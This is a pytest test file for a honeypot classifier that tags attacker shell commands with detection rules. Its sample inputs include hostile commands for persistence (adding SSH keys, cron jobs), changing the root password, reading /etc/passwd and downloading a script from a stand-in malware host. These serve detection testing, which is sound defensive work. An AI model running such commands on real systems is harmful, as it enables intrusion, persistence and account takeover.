import textwrap

import pytest

from collector.classifier import classify, load_rules

RULES = load_rules()


def ids(commands, failed=0):
    return {m.rule.id for m in classify(commands, failed, RULES)}


@pytest.mark.parametrize(
    "command, expected",
    [
        ("uname -a", "discovery-system-info"),
        ("cat /proc/cpuinfo | grep name | wc -l", "discovery-system-info"),
        ("whoami", "discovery-owner-user"),
        ("cat /etc/passwd", "discovery-local-accounts"),
        ("ifconfig", "discovery-network-config"),
        ('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys', "persistence-ssh-authorized-keys"),
        ('(crontab -l 2>/dev/null; echo "* * * * * x") | crontab -', "persistence-cron"),
        ('echo "root:x"|chpasswd|bash', "credential-change"),
        ("cd /tmp; wget http://malware.example/a.sh", "tool-transfer"),
    ],
)
def test_rule_fires(command, expected):
    assert expected in ids([command])


@pytest.mark.parametrize(
    "command, not_expected",
    [
        ("cat /etc/passwd", "credential-change"),  # reading the file isn't changing a password
        ("crontab -l", "persistence-cron"),  # listing isn't persistence
        ("identify", "discovery-owner-user"),
        ("ls -la", None),
    ],
)
def test_rule_does_not_fire(command, not_expected):
    found = ids([command])
    if not_expected is None:
        assert found == set()
    else:
        assert not_expected not in found


def test_brute_force_threshold():
    assert "auth-brute-force" not in ids([], failed=2)
    assert "auth-brute-force" in ids([], failed=3)


def test_evidence_is_first_matching_command():
    [m] = [m for m in classify(["ls", "uname -a", "uname -m"], 0, RULES)
           if m.rule.id == "discovery-system-info"]
    assert m.evidence == "uname -a"


def test_every_rule_has_valid_attack_id():
    assert all(r.attack for r in RULES)


def test_bad_rules_are_rejected(tmp_path):
    bad = tmp_path / "rules.yml"
    bad.write_text(textwrap.dedent("""
        version: 1
        rules:
          - id: x
            label: X
            attack: T99
            confidence: high
            match: {type: command, regex: 'x'}
            evidence: x
    """))
    with pytest.raises(ValueError, match="ATT&CK"):
        load_rules(bad)


def test_event_rule_proxy_attempt():
    found = {m.rule.id for m in classify([], 0, RULES, {"cowrie.direct-tcpip.request": 2})}
    assert "proxy-port-forwarding" in found
    assert "proxy-port-forwarding" not in ids([])
